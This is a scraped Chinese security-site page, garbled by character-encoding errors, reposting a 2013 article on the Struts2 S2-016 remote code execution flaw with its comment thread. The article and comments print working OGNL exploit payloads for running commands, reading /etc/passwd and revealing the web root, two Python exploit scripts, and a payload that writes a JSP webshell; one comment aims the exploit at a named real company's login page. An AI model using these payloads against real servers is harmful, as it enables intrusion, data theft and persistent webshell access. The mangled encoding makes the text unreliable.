å¥½å§ï¼ŒåŸºä½¬ï¼Œé¡¶ä½ ä¸€ä¸ªï¼Œä¸é”™ã€‚</p>
<ul>
<li><a href="">ä¸‹ä¸€é¡µ Â»</a>
Powered by <a href="http://wordpress.org/" target="_blank">WordPress</a> | GZai Theme by <a href="http://huaidan.org/" title="GZai Theme produced by é¬¼ä»”" target="_blank">é¬¼ä»”</a>
<a href="http://tongji.baidu.com/hm-web/welcome/ico?s=9fc41da6a2322bdd80563c9d5a4bdb1d" target="_blank"><img src="" alt=""></a></li>
</ul>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/å®‰å…¨/">å®‰å…¨</a></li></span><span class="breadcrumb"><li><a href="/categories/å®‰å…¨/">å®‰å…¨</a></li><li><a href="/categories/å®‰å…¨/PHP-WordPress/">PHP-WordPress</a></li></span></span> | <span class="tags">Tagged <a href="/tags/PHP-WordPress/" class="label label-primary">PHP-WordPress</a><a href="/tags/å®‰å…¨/" class="label label-success">å®‰å…¨</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-å®‰å…¨-PHP-WordPress--WordPress-361PHPå¯¹è±¡æ³¨å…¥æ¼æ´-WooYunçŸ¥è¯†åº“/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-å®‰å…¨-PHP-WordPress--WordPress-361PHPå¯¹è±¡æ³¨å…¥æ¼æ´-WooYunçŸ¥è¯†åº“" data-count-type="comments">æš‚æ— è¯„è®º</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-å®‰å…¨-strutsJava--æ›´æ–°Struts2å†çˆ†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-016ï¼‰-FreebuFCOM/">[æ›´æ–°]Struts2å†çˆ†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-å®‰å…¨-strutsJava--æ›´æ–°Struts2å†çˆ†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-016ï¼‰-FreebuFCOM/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-struts2-s2-016-freebuf-com">[æ›´æ–°]Struts2å†çˆ†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-016ï¼‰- FreebuF.COM</h1>
<h3 id="-">åˆ†äº«åˆ°</h3>
<ul>
<li><a href="">ä¸€é”®åˆ†äº«</a></li>
<li><a href="">QQç©ºé—´</a></li>
<li><a href="">æ–°æµªå¾®åš</a></li>
<li><a href="">ç™¾åº¦äº‘æ”¶è—</a></li>
<li><a href="">äººäººç½‘</a></li>
<li><a href="">è…¾è®¯å¾®åš</a></li>
<li><a href="">ç™¾åº¦ç›¸å†Œ</a></li>
<li><a href="">å¼€å¿ƒç½‘</a></li>
<li><a href="">è…¾è®¯æœ‹å‹</a></li>
<li><a href="">ç™¾åº¦è´´å§</a></li>
<li><a href="">è±†ç“£ç½‘</a></li>
<li><a href="">æœç‹å¾®åš</a></li>
<li><a href="">ç™¾åº¦æ–°é¦–é¡µ</a></li>
<li><a href="">QQå¥½å‹</a></li>
<li><a href="">å’Œè®¯å¾®åš</a></li>
<li><a href="">æ›´å¤š...</a></li>
</ul>
<p><a href="">ç™¾åº¦åˆ†äº«</a></p>
<ul>
<li><a href="http://www.freebuf.com/" target="_blank">é¦–é¡µ</a></li>
<li><a href="http://www.freebuf.com/category/news" target="_blank">èµ„è®¯</a></li>
<li><a href="http://www.freebuf.com/category/tools" target="_blank">å·¥å…·</a></li>
<li><p><a href="http://www.freebuf.com/category/articles" target="_blank">æ–‡ç« </a></p>
</li>
<li><p><a href="http://www.freebuf.com/category/articles/web" target="_blank">WEBå®‰å…¨</a></p>
</li>
<li><a href="http://www.freebuf.com/category/articles/wireless" target="_blank">æ— çº¿å®‰å…¨</a></li>
<li><a href="http://www.freebuf.com/category/articles/system" target="_blank">ç³»ç»Ÿå®‰å…¨</a></li>
<li><a href="http://www.freebuf.com/category/articles/database" target="_blank">æ•°æ®åº“å®‰å…¨</a></li>
<li><a href="http://www.freebuf.com/category/articles/terminal" target="_blank">ç»ˆç«¯å®‰å…¨</a></li>
<li><a href="http://www.freebuf.com/category/articles/others-articles" target="_blank">å…¶ä»–</a></li>
<li><a href="http://www.freebuf.com/category/video" target="_blank">è§†é¢‘</a></li>
<li><a href="http://www.freebuf.com/category/jobs" target="_blank">æ‹›è˜</a></li>
<li><a href="http://www.freebuf.com/category/geek" target="_blank">æå®¢</a></li>
<li><a href="http://www.freebuf.com/bufer" target="_blank">è¾¾äºº</a></li>
<li><a href="http://club.freebuf.com/" target="_blank">ç¤¾åŒº</a></li>
<li><a href="http://www.freebuf.com/newsend" target="_blank">æŠ•ç¨¿</a></li>
</ul>
<p><a href="http://www.freebuf.com/wp-login.php?redirect_to=http://www.freebuf.com" title="ç™»é™†" target="_blank">ç™»é™†</a><a href="http://www.freebuf.com/wp-login.php?action=register" target="_blank">æ³¨å†Œ</a></p>
<p><a href="http://www.freebuf.com/" target="_blank"><img src="" alt="freebuf"></a></p>
<p><a href="http://www.weibo.com/freebuf" title="æ”¶å¬æ–°æµªå¾®åš" target="_blank">æ–°æµªå¾®åš</a> <a href="http://t.qq.com/freebuf" title="æ”¶å¬è…¾è®¯å¾®åš" target="_blank">è…¾è®¯å¾®åš</a><a href="http://www.freebuf.com/feed" title="è®¢é˜…æˆ‘ä»¬" target="_blank">è®¢é˜…æˆ‘ä»¬</a></p>
<h3 id="-struts2-s2-016-">[æ›´æ–°]Struts2å†çˆ†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-016ï¼‰</h3>
<p><a href="">phper</a> @ <a href="http://www.freebuf.com/category/vuls" title="æŸ¥çœ‹ æ¼æ´ ä¸­çš„å…¨éƒ¨æ–‡ç« " target="_blank">æ¼æ´</a> 2013-07-17 å…± <strong>28624</strong> äººå›´è§‚ </p>
<p><strong>Strutsåˆçˆ†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´äº†ï¼**</strong>åœ¨è¿™æ¬¡çš„æ¼æ´ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ“çºµå‚æ•°è¿œç¨‹æ‰§è¡Œæ¶æ„ä»£ç ã€‚<strong>**Struts 2.3.15.1ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œå‚æ•°actionçš„å€¼redirectä»¥åŠredirectActionæ²¡æœ‰æ­£ç¡®è¿‡æ»¤ï¼Œå¯¼è‡´ognlä»£ç æ‰§è¡Œã€‚ </strong></p>
<p><strong>æè¿°</strong>
å½±å“ç‰ˆæœ¬ Struts 2.0.0 - Struts 2.3.15 æŠ¥å‘Šè€… Takeshi Terada of Mitsui Bussan Secure Directions, Inc. CVEç¼–å· CVE-2013-2251</p>
<p><strong>æ¼æ´è¯æ˜</strong></p>
<p>å‚æ•°ä¼šä»¥OGNLè¡¨è¾¾å¼æ‰§è¡Œ
<a href="http://host/struts2-blank/example/X.action?action:%25{3/*4}" target="_blank">http://host/struts2-blank/example/X.action?action:%25{3/*4}</a> <a href="http://host/struts2-showcase/employee/save.action?redirect:%25{3/*4}" target="_blank">http://host/struts2-showcase/employee/save.action?redirect:%25{3/*4}</a></p>
<p>ä»£ç æ‰§è¡Œ</p>
<p><a href="http://host/struts2-blank/example/X.action?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}" target="_blank">http://host/struts2-blank/example/X.action?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}</a> <a href="http://host/struts2-showcase/employee/save.action?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}" target="_blank">http://host/struts2-showcase/employee/save.action?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}</a> <a href="http://host/struts2-showcase/employee/save.action?redirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}" target="_blank">http://host/struts2-showcase/employee/save.action?redirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}</a></p>
<p><strong>æ¼æ´åŸç†</strong></p>
<p>The Struts 2 DefaultActionMapper supports a method for short-circuit navigation state changes by prefixing parameters with â€œaction:â€ or â€œredirect:â€, followed by a desired navigational target expression. This mechanism was intended to help with attaching navigational information to buttons within forms.</p>
<p>In Struts 2 before 2.3.15.1 the information following â€œaction:â€, â€œredirect:â€ or â€œredirectAction:â€ is not properly sanitized. Since said information will be evaluated as OGNL expression against the value stack, this introduces the possibility to inject server side code.</p>
<p><a href="http://struts.apache.org/release/2.3.x/docs/s2-016.html" target="_blank">Apacheå®˜æ–¹åœ°å€</a></p>
<p><strong>å›½å†…ç½‘ç«™å—ç¾ä¸¥é‡</strong></p>
<p><strong><img src="http://static.freebuf.com/uploads/image/20130719/20130719234053_37320.jpg" alt="">
</strong></p>
<p><strong>ä»¥ä¸‹ä»…ä¾›æ•™å­¦ç ”ç©¶ä¹‹ç”¨ï¼Œä¸¥ç¦éæ³•ç”¨é€”ï¼</strong></p>
<p>æ‰§è¡Œä»»æ„å‘½ä»¤EXPï¼Œæ„Ÿè°¢Xæä¾›ï¼š
?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{&#39;cat&#39;,&#39;/etc/passwd&#39;})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}</p>
<p>çˆ†ç½‘ç«™è·¯å¾„EXPï¼Œæ„Ÿè°¢h4ck0ræä¾›ï¼š</p>
<p>?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D</p>
<p>pythonæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæ„Ÿè°¢h4ck0ræä¾›</p>
<p>import urllib2,sys,re def get(url, data): string = url + &quot;?&quot; + data req = urllib2.Request(&quot;%s&quot;%string) response = urllib2.urlopen(req).read().strip() print strip(response) def strip(str): tmp = str.strip() blank<em>line=re.compile(&#39;\x00&#39;) tmp=blank<em>line.sub(&#39;&#39;,tmp) return tmp if <strong>name</strong> == &#39;__main</em></em>&#39;: url = sys.argv[1] cmd = sys.argv[2] cmd1 = sys.argv[3] attack=&quot;redirect:${%%23a%%3d(new%%20java.lang.ProcessBuilder(new%%20java.lang.String[]{&#39;%s&#39;,&#39;%s&#39;})).start(),%%23b%%3d%%23a.getInputStream(),%%23c%%3dnew%%20java.io.InputStreamReader(%%23b),%%23d%%3dnew%%20java.io.BufferedReader(%%23c),%%23e%%3dnew%%20char[50000],%%23d.read(%%23e),%%23matt%%3d%%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%%23matt.getWriter().println(%%23e),%%23matt.getWriter().flush(),%%23matt.getWriter().close()}&quot;%(cmd,cmd1) get(url,attack)</p>
<p>GETSHELL EXPï¼Œæ„Ÿè°¢coffeeæä¾›ï¼š</p>
<p>?redirect:${ %23req%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;), %23p%3d(%23req.getRealPath(%22/%22)%2b%22test.jsp%22).replaceAll(&quot;\\&quot;, &quot;/&quot;), new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close() }&amp;c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%</p>
<p>ç„¶åç”¨ä»¥ä¸‹ä»£ç å†™shell:</p>
&lt;form action=&quot;<a href="http://www./*/*/*.jp/acdap/test.jsp?f=1.jsp&amp;quot" target="_blank">http://www./*/*/*.jp/acdap/test.jsp?f=1.jsp&amp;quot</a>; method=&quot;post&quot;&gt; <textarea >code</textarea> <input type=submit value="æäº¤"> </form>

<p>ä¸Šå‰ç›®å½•ç”Ÿæˆ1.jsp</p>
<p>5 1 æ‚¨å·²è¯„ä»·ï¼</p>
<h3 id="-freebuf-com-http-www-freebuf-com-"><img src="" alt=""> <strong>å¦‚æ–‡ä¸­æœªç‰¹åˆ«å£°æ˜è½¬è½½è¯·æ³¨æ˜å‡ºè‡ª:</strong> <a href="http://www.freebuf.com/" target="_blank">FreebuF.COM</a></h3>
<p><img src="" alt=""> <a href="&quot;ç´¯è®¡åˆ†äº«1æ¬¡&quot;">1</a>
<img src="http://www.freebuf.com/buf/plugins/wp-favorite-posts/img/heart.png" alt="Favorite" title="Favorite"><img src="http://www.freebuf.com/buf/plugins/wp-favorite-posts/img/loading.gif" alt="Loading" title="Loading"><a href="http://www.freebuf.com/vuls/?wpfpaction=add&amp;postid=11220" title="æ”¶è—è¯¥æ–‡" target="_blank">æ”¶è—è¯¥æ–‡</a></p>
<h3 id="-">ç›¸å…³æ–‡ç« </h3>
<ul>
<li><a href="http://www.freebuf.com/vuls/11220.html" target="_blank">[æ›´æ–°]Struts2å†çˆ†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆS2-016ï¼‰</a></li>
</ul>
<p><strong>49</strong>æ¡è¯„è®º <strong>28626</strong>äººå·²å›´è§‚</p>
<ul>
<li><a href="http://www.freebuf.com/vuls/10697.html" target="_blank">Android ICS adbè°ƒè¯•å·¥å…·ç³»ç»Ÿè¿˜åŸç›®å½•éå†æ¼æ´ï¼ˆå¯ææƒï¼‰</a></li>
</ul>
<p><strong>6</strong>æ¡è¯„è®º <strong>8306</strong>äººå·²å›´è§‚</p>
<ul>
<li><a href="http://www.freebuf.com/vuls/10611.html" target="_blank">ç¾å›½VPSç®¡ç†ç³»ç»ŸSolusVM 1.13.03 SQLæ³¨å…¥æ¼æ´ï¼ˆå«expï¼‰</a></li>
</ul>
<p><strong>12</strong>æ¡è¯„è®º <strong>24962</strong>äººå·²å›´è§‚</p>
<ul>
<li><a href="http://www.freebuf.com/vuls/10291.html" target="_blank">[æœ€æ–°]Pleskä¸»æœºç®¡ç†è½¯ä»¶è¿œç¨‹get shell 0day</a></li>
</ul>
<p><strong>8</strong>æ¡è¯„è®º <strong>11826</strong>äººå·²å›´è§‚</p>
<ul>
<li><a href="http://www.freebuf.com/vuls/10219.html" target="_blank">Metasploitæ›´æ–°â€nginxæ•´æ•°æº¢å‡ºæ¼æ´â€æ”»å‡»æ’ä»¶</a></li>
</ul>
<p><strong>6</strong>æ¡è¯„è®º <strong>17096</strong>äººå·²å›´è§‚
ï»¿</p>
<h2 id="49-comments-">49 Comments <a href="">å‘è¡¨è¯„è®º</a></h2>
<ol>
<li><img src="" alt=""> ç”Ÿç”Ÿä¸æ¯ <a href=""></a> 2013-07-17    1æ¥¼</li>
</ol>
<p>ç›®æµ‹åˆ©ç”¨å·¥å…·é©¬ä¸Šå‡ºç‚‰</p>
<p>POCæ¥è‡ªå®˜æ–¹ï¼š
<a href="http://struts.apache.org/release/2.3.x/docs/s2-016.html" target="_blank"><a href="http://struts.apache.org/release/2.3.x/docs/s2-016.html">http://struts.apache.org/release/2.3.x/docs/s2-016.html</a></a>
<a href="http://struts.apache.org/release/2.3.x/docs/s2-017.htm" target="_blank"><a href="http://struts.apache.org/release/2.3.x/docs/s2-017.htm">http://struts.apache.org/release/2.3.x/docs/s2-017.htm</a></a>
ã€‚ã€‚ç¢‰å ¡ä¸
<a href="">äº®äº†</a>(6)
<a href="http://www.freebuf.com/vuls/?replytocom=12981#respond" target="_blank">å›å¤</a></p>
<ol>
<li><img src="" alt=""> fake <a href=""></a> 2013-07-17    2æ¥¼</li>
</ol>
<p><img src="http://static.freebuf.com/uploads/image/20130717/20130717015140_44183.png" alt="">
ä¹Œäº‘å·²ç»å¼€å§‹äº†â€¦â€¦é»‘é˜”ä»¬æ‹–åº“å§â€¦â€¦
<a href="">äº®äº†</a>(15)
<a href="http://www.freebuf.com/vuls/?replytocom=12984#respond" target="_blank">å›å¤</a></p>
<ol>
<li><img src="" alt=""> å‘½è¿ <a href=""></a> 2013-07-17    3æ¥¼</li>
</ol>
<p>ä¸æ¯æŠ¢æ²™å‘å¥½é€Ÿåº¦ï¼Œè¯è¯´ä¹Œäº‘åˆæœ‰SBåœ¨åˆ·åˆ†äº†ã€‚é»‘äº§çš„å¤§å¥½æœºä¼šä¸æŠŠæ¡ï¼Œå‘µå‘µã€‚
<a href="">äº®äº†</a>(17)
<a href="http://www.freebuf.com/vuls/?replytocom=12985#respond" target="_blank">å›å¤</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=3881" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/n0bele" target="_blank">n0bele </a> (1çº§)  <a href=""></a> 2013-07-17    4æ¥¼</li>
</ol>
<p>è¿™çœŸæ˜¯ä¸ªå¥½å‚å•†ï¼Œæ²¡å®ƒé»‘å¸½å­å’Œé‚£äº›åˆåšé»‘äº§åˆåšç™½å¸½å­çš„å¸½å­éƒ½å¿«æˆ´ä¸ç¨³äº†.
<a href="">äº®äº†</a>(7)
<a href="http://www.freebuf.com/vuls/?replytocom=12986#respond" target="_blank">å›å¤</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=3486" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/hackmissmiss" target="_blank">hackmissmiss </a> (1çº§)  <a href=""></a> 2013-07-17    5æ¥¼</li>
</ol>
<p>åˆ·ä½ å¦ˆçš„åˆ† ä¸€ç¾¤å°æœ‹å‹ ä¸ºäº†æ»¡è¶³è‡ªå·±çš„è™šè£å¿ƒ ä¸åœçš„æ‰¾ç½‘ç«™åˆ·åˆ† SB
<a href="">äº®äº†</a>(10)
<a href="http://www.freebuf.com/vuls/?replytocom=12987#respond" target="_blank">å›å¤</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=1596" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/è“é£" target="_blank">è“é£ </a> (1çº§)  <a href=""></a> 2013-07-17    6æ¥¼</li>
</ol>
<p>å°‘ä¾  è®°å¾—æä¸‹è£¤å­ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚
<a href="">äº®äº†</a>(1)
<a href="http://www.freebuf.com/vuls/?replytocom=12988#respond" target="_blank">å›å¤</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=3647" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/mujj" target="_blank">mujj </a> (1çº§)  <a href=""></a> 2013-07-17    7æ¥¼</li>
</ol>
<p>åˆ·åˆ†åˆå¼€å§‹äº†ä¹ˆ
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=12989#respond" target="_blank">å›å¤</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=2313" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/angellover08" target="_blank">angellover08 </a> (1çº§) æŸç”²æ–¹æ¼æ´æŒ–æ˜ç ”ç©¶å‘˜ <a href=""></a> 2013-07-17    8æ¥¼</li>
</ol>
<p>æƒ³æŠ•èº«é»‘äº§ï¼Œæœ¨æœ‰é—¨è·¯å•Š
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=12990#respond" target="_blank">å›å¤</a></p>
<ol>
<li><img src="" alt=""> z0mbie <a href=""></a> 2013-07-17    9æ¥¼</li>
</ol>
<p>å°å¼Ÿçœ‹ä¸æ‡‚ï¼Œå“ªä½èƒ½ç»™ä¸ªæ‰§è¡Œå‘½ä»¤çš„è¯­å¥
<a href="">äº®äº†</a>(7)
<a href="http://www.freebuf.com/vuls/?replytocom=12992#respond" target="_blank">å›å¤</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=3777" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/uj70ky7b" target="_blank">uj70ky7b </a> (1çº§)  <a href=""></a> 2013-07-17    10æ¥¼</li>
</ol>
<p>åˆ·ä½ å¦¹å¦¹çš„åˆ†å•Šï¼Œèƒ½åƒå—. ä¸€åˆ†ç­‰äºå‡ ä¸‡å—å•Šã€‚
<a href="">äº®äº†</a>(8)
<a href="http://www.freebuf.com/vuls/?replytocom=13002#respond" target="_blank">å›å¤</a></p>
<ol>
<li><img src="" alt=""> X <a href=""></a> 2013-07-17    11æ¥¼</li>
</ol>
<p>?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{&#39;cat&#39;,&#39;/etc/passwd&#39;})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}</p>
<p><a href="">äº®äº†</a>(30)
<a href="http://www.freebuf.com/vuls/?replytocom=13005#respond" target="_blank">å›å¤</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=3432" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/yplinfo" target="_blank">yplinfo </a> (1çº§) ä¸€å¥è¯æœ¨é©¬ <a href=""></a> 2013-07-17    12æ¥¼</li>
</ol>
<p>å“ï¼ŒSBæ‰åˆ·åˆ†
<a href="">äº®äº†</a>(1)
<a href="http://www.freebuf.com/vuls/?replytocom=13006#respond" target="_blank">å›å¤</a></p>
<ol>
<li><img src="" alt=""> Cr0w <a href=""></a> 2013-07-17    13æ¥¼</li>
</ol>
<p>S2-17
<a href="http://host/struts2-showcase/fileupload/upload.action?redirect:http://www.yahoo.com/" target="_blank"><a href="http://host/struts2-showcase/fileupload/upload.action?redirect:http://www.yahoo.com/">http://host/struts2-showcase/fileupload/upload.action?redirect:http://www.yahoo.com/</a></a>
<a href="http://host/struts2-showcase/modelDriven/modelDriven.action?redirectAction:http://www.google.com/%23" target="_blank"><a href="http://host/struts2-showcase/modelDriven/modelDriven.action?redirectAction:http://www.google.com/%23">http://host/struts2-showcase/modelDriven/modelDriven.action?redirectAction:http://www.google.com/%23</a></a>
<a href="">äº®äº†</a>(3)
<a href="http://www.freebuf.com/vuls/?replytocom=13007#respond" target="_blank">å›å¤</a></p>
<ol>
<li><img src="" alt=""> ç”Ÿç”Ÿä¸æ¯ <a href=""></a> 2013-07-17    14æ¥¼</li>
</ol>
<p><a href="https://kf.sf-express.com/css/loginmgmt/index.action?redirect:$" target="_blank"><a href="https://kf.sf-express.com/css/loginmgmt/index.action?redirect:$">https://kf.sf-express.com/css/loginmgmt/index.action?redirect:$</a></a>{%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27cat%27,%27/etc/passwd%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}
<a href="">äº®äº†</a>(11)
<a href="http://www.freebuf.com/vuls/?replytocom=13009#respond" target="_blank">å›å¤</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=3687" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/lock" target="_blank">lock </a> (6çº§) fork you! <a href=""></a> 2013-07-17    15æ¥¼</li>
</ol>
<p>import urllib2,getopt,sys</p>
<p>def info():
print &quot;python struts.py -u <a href="http://baidu.com/test.action" target="_blank"><a href="http://baidu.com/test.action">http://baidu.com/test.action</a></a> -d whoami&quot;</p>
<p>def get(url, data):
string = url + &quot;?&quot; + data
req = urllib2.Request(string)
response = urllib2.urlopen(req)
print response.read()</p>
<p>if <strong>name</strong> == &#39;<strong>main</strong>&#39; and len(sys.argv) &lt; 2:
info()
try:
opts, args = getopt.getopt(sys.argv[1:],&quot;u:d:&quot;)
except:
sys.exit(2)
for opt, value in opts:
if opt == &#39;-u&#39;:
url = value
elif opt == &#39;-d&#39;:
test = value
attack=&quot;?redirect:${/#a=(new java.lang.ProcessBuilder(&#39;%s&#39;)).start(),/#b=/#a.getInputStream(),/#c=new java.io.InputStreamReader(/#b),/#d=new java.io.BufferedReader(/#c),/#e=new char[50000],/#d.read(/#e),/#matt=/#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),/#matt.getWriter().println(/#e),/#matt.getWriter().flush(),/#matt.getWriter().close()}&quot;%test
get(url,attack)</p>
<p><a href="">äº®äº†</a>(8)
<a href="http://www.freebuf.com/vuls/?replytocom=13013#respond" target="_blank">å›å¤</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=3113" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/äºŒæ‰‹ç«ç‘°" target="_blank">äºŒæ‰‹ç«ç‘° </a> (1çº§) äººç”Ÿå¦‚æ¢¦äº¦å¦‚ç”» <a href=""></a> 2013-07-17    16æ¥¼</li>
</ol>
<p>éº»çƒ¦å„ä½å¤§ç¥æä¾›çˆ†ç½‘ç«™ç»å¯¹è·¯å¾„çš„åŠæ³•ã€‚ã€‚ã€‚ã€‚
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13016#respond" target="_blank">å›å¤</a></p>
<ul>
<li><img src="" alt=""> h4ck0r <a href=""></a> 2013-07-17</li>
</ul>
<p>@äºŒæ‰‹ç«ç‘°  ?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D
<a href="">äº®äº†</a>(1)
<a href="http://www.freebuf.com/vuls/?replytocom=13023#respond" target="_blank">å›å¤</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=7" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/pnig0s" target="_blank">pnig0s </a><img src="http://www.freebuf.com/buf/themes/freebuf/images/medals/f1.png" alt="" title="FBè¾¾äºº"> (10çº§) çŸ¥é“åˆ›å®‡å®‰å…¨å·¥ç¨‹å¸ˆ <a href=""></a> 2013-07-17    17æ¥¼</li>
</ul>
<p>è¯„è®ºé‡Œå„è·¯å¤§ç¥éƒ½å‘å¨äº†ï¼šï¼‰
<a href="">äº®äº†</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13017#respond" target="_blank">å›å¤</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=1353" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/å…ƒé¦–" target="_blank">å…ƒé¦– </a> (3çº§)  <a href=""></a> 2013-07-17    18æ¥¼</li>
</ul>
<p>è·¯å¾„</p>
<p><a href="http://www.xxx.com/xxxx.action?redirect%3A%24{%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28&quot;%2F&quot;%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29}" target="_blank"><a 